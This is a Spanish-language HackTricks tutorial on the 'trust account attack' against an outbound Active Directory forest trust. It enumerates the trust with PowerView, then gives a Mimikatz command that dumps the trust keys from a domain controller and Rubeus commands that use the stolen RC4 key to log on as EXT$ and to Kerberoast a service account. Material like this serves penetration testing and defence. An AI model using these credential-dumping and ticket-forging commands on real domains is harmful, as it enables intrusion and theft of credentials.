# Dominio Forestal Externo - Unidireccional (Saliente)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

En este escenario, **tu dominio** está **confiando** algunos **privilegios** a un principal de **diferentes dominios**.

## Enumeración

### Confianza Saliente
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Ataque a la Cuenta de Confianza

Existe una vulnerabilidad de seguridad cuando se establece una relación de confianza entre dos dominios, identificados aquí como dominio **A** y dominio **B**, donde el dominio **B** extiende su confianza al dominio **A**. En esta configuración, se crea una cuenta especial en el dominio **A** para el dominio **B**, la cual desempeña un papel crucial en el proceso de autenticación entre los dos dominios. Esta cuenta, asociada con el dominio **B**, se utiliza para cifrar tickets para acceder a servicios en los dominios.

El aspecto crítico a entender aquí es que la contraseña y el hash de esta cuenta especial pueden ser extraídos de un Controlador de Dominio en el dominio **A** utilizando una herramienta de línea de comandos. El comando para realizar esta acción es:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Esta extracción es posible porque la cuenta, identificada con un **$** después de su nombre, está activa y pertenece al grupo "Domain Users" del dominio **A**, heredando así los permisos asociados con este grupo. Esto permite a las personas autenticarse contra el dominio **A** utilizando las credenciales de esta cuenta.

**Advertencia:** Es factible aprovechar esta situación para obtener un punto de apoyo en el dominio **A** como usuario, aunque con permisos limitados. Sin embargo, este acceso es suficiente para realizar enumeración en el dominio **A**.

En un escenario donde `ext.local` es el dominio confiable y `root.local` es el dominio de confianza, se crearía una cuenta de usuario llamada `EXT$` dentro de `root.local`. A través de herramientas específicas, es posible volcar las claves de confianza de Kerberos, revelando las credenciales de `EXT$` en `root.local`. El comando para lograr esto es:
```bash
lsadump::trust /patch
```
Siguiendo esto, uno podría usar la clave RC4 extraída para autenticarse como `root.local\EXT$` dentro de `root.local` usando otro comando de herramienta:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Este paso de autenticación abre la posibilidad de enumerar e incluso explotar servicios dentro de `root.local`, como realizar un ataque de Kerberoast para extraer credenciales de cuentas de servicio usando:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Obtención de la contraseña de confianza en texto claro

En el flujo anterior se utilizó el hash de confianza en lugar de la **contraseña en texto claro** (que también fue **extraída por mimikatz**).

La contraseña en texto claro se puede obtener convirtiendo la salida \[ CLEAR ] de mimikatz de hexadecimal y eliminando los bytes nulos '\x00':

![](<../../.gitbook/assets/image (938).png>)

A veces, al crear una relación de confianza, el usuario debe escribir una contraseña para la confianza. En esta demostración, la clave es la contraseña de confianza original y, por lo tanto, legible para humanos. A medida que la clave cambia (cada 30 días), la contraseña en texto claro no será legible para humanos pero técnicamente aún utilizable.

La contraseña en texto claro se puede utilizar para realizar autenticación regular como la cuenta de confianza, como alternativa a solicitar un TGT utilizando la clave secreta de Kerberos de la cuenta de confianza. Aquí, consultando root.local desde ext.local para miembros de Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Referencias

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
